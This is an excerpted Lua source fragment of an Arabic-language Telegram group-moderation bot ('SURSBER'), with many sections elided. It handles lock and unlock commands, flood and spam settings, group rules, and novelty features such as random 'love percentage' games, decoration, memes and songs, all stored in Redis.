DevAbs:set(SURSBER..'Rio:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل امسح بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and ChCheck(msg) or text == "عدد الميديا" and ChCheck(msg) then 
local M = DevAbs:scard(SURSBER.."Rio:cleaner"..msg.chat_id_)
if M ~= 0 then
...
DevAbs:del(SURSBER.."Rio:cleaner"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد ميديا هنا", 1, 'md') 
end end 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Lock:CleanMusic'..msg.chat_id_,true)  
end
if text == "تعطيل مسح الاغاني" and Constructor(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل مسح الاغاني بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Lock:CleanMusic'..msg.chat_id_) 
end
if CleanerMusic(msg) then
if DevAbs:get(SURSBER..'Rio:Lock:CleanMusic'..msg.chat_id_) then 
if text == "الاغاني" and ChCheck(msg) or text == "عدد الاغاني" and ChCheck(msg) then 
local M = DevAbs:scard(SURSBER.."Rio:cleanermusic"..msg.chat_id_)
if M ~= 0 then
...
local List = DevAbs:smembers(SURSBER.."Rio:cleanermusic"..msg.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevAbs:del(SURSBER.."Rio:cleanermusic"..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙لاتوجد اغاني هنا", 1, 'md') 
end end end end
--     Source SURSBER     --
...
if DevAbs:get(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التعديل")  
DevAbs:del(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_)
else
...
DevAbs:del(SURSBER.."Rio:Lock:Bots"..msg.chat_id_)  
end end
if UnLockText[2] == "التكرار" then 
DevAbs:hdel(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التكرار")  
end
if BasicConstructor(msg) then
if UnLockText[2] == "التثبيت" then
if DevAbs:get(SURSBER..'Rio:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح التثبيت")  
DevAbs:del(SURSBER..'Rio:Lock:Pin'..msg.chat_id_)
DevAbs:srem(SURSBER.."Rio:Lock:Pinpin",msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Text'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Photo'..msg.chat_id_)
else
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙الصور بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if UnLockText[2] == "الكلايش" then
if DevAbs:get(SURSBER..'Rio:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","᥀︙تم فتح الكلايش")  
DevAbs:del(SURSBER..'Rio:Lock:Spam'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Join'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Videos'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Document'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Inline'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Markdown'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Gifs'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Music'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Voice'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Links'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Location'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Tags'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Hashtak'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Contact'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:WebLinks'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Arabic'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:English'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:TagServr'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Stickers'..msg.chat_id_)
else
...
DevAbs:del(SURSBER..'Rio:Lock:Forwards'..msg.chat_id_)
else
...
DevAbs:set(SURSBER.."Rio:Lock:Bots"..msg.chat_id_,"del") DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
LockList ={'Rio:Lock:Links','Rio:Lock:Contact','Rio:Lock:Forwards','Rio:Lock:Videos','Rio:Lock:Gifs','Rio:Lock:EditMsgs','Rio:Lock:Stickers','Rio:Lock:Farsi','Rio:Lock:Spam','Rio:Lock:WebLinks','Rio:Lock:Photo'}
for i,Lock in pairs(LockList) do
DevAbs:set(SURSBER..Lock..msg.chat_id_,true)
end
...
DevAbs:del(SURSBER..UnLock..msg.chat_id_)
end
...
DevAbs:del(SURSBER..'Rio:Lock:Fshar'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:Lock:Taf'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:Lock:Kfr'..msg.chat_id_) 
DevAbs:set(SURSBER.."Rio:Lock:Bots"..msg.chat_id_,"del") DevAbs:hset(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed") 
...
DevAbs:set(SURSBER..'Rio:Lock:Fshar'..msg.chat_id_,true) DevAbs:set(SURSBER..'Rio:Lock:Taf'..msg.chat_id_,true) DevAbs:set(SURSBER..'Rio:Lock:Kfr'..msg.chat_id_,true) DevAbs:hdel(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_ ,"Spam:User") 
...
DevAbs:set(SURSBER..'Rio:Spam:Text'..msg.chat_id_,SetSpam)
...
DevAbs:set(SURSBER.."Rio:SudoBot:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:BasicConstructor:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:Constructor:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:Managers:Rd"..msg.chat_id_,Text) 
...
DevAbs:set(SURSBER.."Rio:Admins:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:VipMem:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:Cleaner:Rd"..msg.chat_id_,Text)
...
DevAbs:set(SURSBER.."Rio:mem:Rd"..msg.chat_id_,Text)
...
DevAbs:del(SURSBER.."Rio:mem:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:Cleaner:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:VipMem:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:Admins:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:Managers:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:Constructor:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:BasicConstructor:Rd"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:SudoBot:Rd"..msg.chat_id_)
end
end
--     Source SURSBER     --
...
DevAbs:del(SURSBER..'Rio:RioSudo:')
...
DevAbs:srem(SURSBER..'Rio:Tkeed:'..msg.chat_id_, v)
end 
...
DevAbs:del(SURSBER..'Rio:Filters:'..msg.chat_id_)
DevAbs:del(SURSBER..'Rio:Filters:'..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:FilterAnimation"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:FilterPhoto"..msg.chat_id_)
DevAbs:del(SURSBER.."Rio:FilterSteckr"..msg.chat_id_)
end
...
DevAbs:del(SURSBER..'Rio:Ban:'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:Admins:'..msg.chat_id_) DevAbs:del(SURSBER..'User:Donky:'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:VipMem:'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:Filters:'..msg.chat_id_) DevAbs:del(SURSBER..'Rio:Muted:'..msg.chat_id_)
...
local basicconstructor = DevAbs:smembers(SURSBER..'Rio:BasicConstructor:'..msg.chat_id_)
local constructor = DevAbs:smembers(SURSBER..'Rio:Constructor:'..msg.chat_id_)
local Managers = DevAbs:smembers(SURSBER..'Rio:Managers:'..msg.chat_id_)
local admins = DevAbs:smembers(SURSBER..'Rio:Admins:'..msg.chat_id_)
local vipmem = DevAbs:smembers(SURSBER..'Rio:VipMem:'..msg.chat_id_)
local donky = DevAbs:smembers(SURSBER..'User:Donky:'..msg.chat_id_)
...
spam_c = DevAbs:get(SURSBER..'Rio:Spam:Text'..msg.chat_id_)
end
--     Source SURSBER     --
if DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_, "Spam:User") == "kick" then     
flood = "بالطرد"     
elseif DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "keed" then     
flood = "بالتقيد"     
elseif DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "mute" then     
flood = "بالكتم"           
elseif DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") == "del" then     
flood = "بالحذف"
else     
flood = "مفتوح"     
end
--     Source SURSBER     --
if DevAbs:get(SURSBER.."Rio:Lock:Bots"..msg.chat_id_) == "del" then
lock_bots = "بالحذف"
elseif DevAbs:get(SURSBER.."Rio:Lock:Bots"..msg.chat_id_) == "ked" then
lock_bots = "بالتقيد"   
elseif DevAbs:get(SURSBER.."Rio:Lock:Bots"..msg.chat_id_) == "kick" then
lock_bots = "بالطرد"    
else
lock_bots = "مفتوحه"    
end
--     Source SURSBER     --
if DevAbs:get(SURSBER..'Rio:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه'end
if DevAbs:get(SURSBER..'Rio:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفله' else mute_photo = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفله' else mute_video = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفله' else mute_gifs = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Music'..msg.chat_id_) then mute_music = 'مقفله' else mute_music = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفله' else mute_in = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفله' else mute_voice = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفله' else mute_edit = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفله' else lock_pin = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفله' else lock_sticker = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفله' else lock_tgservice = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفله' else lock_wp = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفله' else lock_htag = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفله' else lock_tag = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Location'..msg.chat_id_) then lock_location = 'مقفله' else lock_location = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفله' else lock_contact = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:English'..msg.chat_id_) then lock_english = 'مقفله' else lock_english = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفله' else lock_arabic = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفله' else lock_forward = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Document'..msg.chat_id_) then lock_file = 'مقفله' else lock_file = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفله' else markdown = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفله' else lock_spam = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفل' else lock_Join = 'مفتوح' end
if DevAbs:get(SURSBER.."Rio:Lock:Welcome"..msg.chat_id_) then send_welcome = 'مقفله' else send_welcome = 'مفتوحه' end
if DevAbs:get(SURSBER..'Rio:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end
if DevAbs:get(SURSBER..'Rio:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end
if DevAbs:get(SURSBER..'Rio:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end
if DevAbs:get(SURSBER..'Rio:Lock:Farsi'..msg.chat_id_) then lock_farsi = 'مقفله' else lock_farsi = 'مفتوحه' end
local Flood_Num = DevAbs:hget(SURSBER.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
--     Source SURSBER     --
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Antk:Rio'..msg.chat_id_) 
end
if text == "تعطيل انطق" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل ميزة انطق'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Antk:Rio'..msg.chat_id_,true)  
end
if text and text:match("^انطق (.*)$") and not DevAbs:get(SURSBER..'Rio:Antk:Rio'..msg.chat_id_) and ChCheck(msg) then
...
--     Source SURSBER     --
if DevAbs:get(SURSBER..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ قوانين المجموعه', 1, 'md')
DevAbs:del(SURSBER..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevAbs:del(SURSBER..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_)
DevAbs:set(SURSBER..'Rio:rules'..msg.chat_id_,text)
...
DevAbs:set(SURSBER..'Rio:setrules'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
end
if text and text:match("^القوانين$") and ChCheck(msg) then
local rules = DevAbs:get(SURSBER..'Rio:rules'..msg.chat_id_)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Zrf:Rio'..msg.chat_id_) 
end
if text == "تعطيل الزخرفه" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الزخرفه بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Zrf:Rio'..msg.chat_id_,true)  
end
if DevAbs:get(SURSBER..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_) then 
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر الزخرفه', 1, 'md')
DevAbs:del(SURSBER..'Zrf:Rio'..msg.chat_id_..msg.sender_user_id_)
return false  
end 
...
if not DevAbs:get(SURSBER..'Rio:Zrf:Rio'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevAbs:setex(SURSBER.."Zrf:Rio"..msg.chat_id_..msg.sender_user_id_,300,true)
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Brg:Rio'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Brg:Rio'..msg.chat_id_,true)  
end
if not DevAbs:get(SURSBER..'Rio:Brg:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Nsba:Rio'..msg.chat_id_) 
end
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Nsba:Rio'..msg.chat_id_,true)  
end
if not DevAbs:get(SURSBER..'Rio:Nsba:Rio'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevAbs:set(SURSBER..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevAbs:get(SURSBER..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevAbs:del(SURSBER..'LoveNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
...
DevAbs:set(SURSBER..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevAbs:get(SURSBER..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevAbs:del(SURSBER..'RyNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevAbs:set(SURSBER..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevAbs:get(SURSBER..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevAbs:del(SURSBER..'JNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevAbs:set(SURSBER..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevAbs:get(SURSBER..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevAbs:del(SURSBER..'HataNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevAbs:set(SURSBER..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevAbs:get(SURSBER..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevAbs:del(SURSBER..'RjolaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevAbs:set(SURSBER..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevAbs:get(SURSBER..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevAbs:del(SURSBER..'AnothaNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
DevAbs:set(SURSBER..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevAbs:get(SURSBER..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevAbs:del(SURSBER..'StupidNsba:Rio'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Rio = math.random(0,100);
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Age:Rio'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Age:Rio'..msg.chat_id_,true)  
end
if not DevAbs:get(SURSBER..'Rio:Age:Rio'..msg.chat_id_) then
...
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Mean:Rio'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Mean:Rio'..msg.chat_id_,true)  
end
if not DevAbs:get(SURSBER..'Rio:Mean:Rio'..msg.chat_id_) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:gif:Rio'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تعطيل المتحركه" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل المتحركه'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:gif:Rio'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevAbs:get(SURSBER..'Rio:gif:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:memz:Rio'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تعطيل الميمز" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الميمز'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:memz:Rio'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevAbs:get(SURSBER..'Rio:memz:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:Audios:Rio'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل غنيلي'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:Audios:Rio'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevAbs:get(SURSBER..'Rio:Audios:Rio'..msg.chat_id_) and SourceCh(msg) then
...
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:del(SURSBER..'Rio:mp3:Rio'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تعطيل اغنيه" and Manager(msg) and SourceCh(msg) then
local SURSBERTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل الاغاني'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SURSBERTeam, 14, string.len(msg.sender_user_id_))
DevAbs:set(SURSBER..'Rio:mp3:Rio'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevAbs:get(SURSBER..'Rio:mp3:Rio'..msg.chat_id_) and SourceCh(msg) then
...
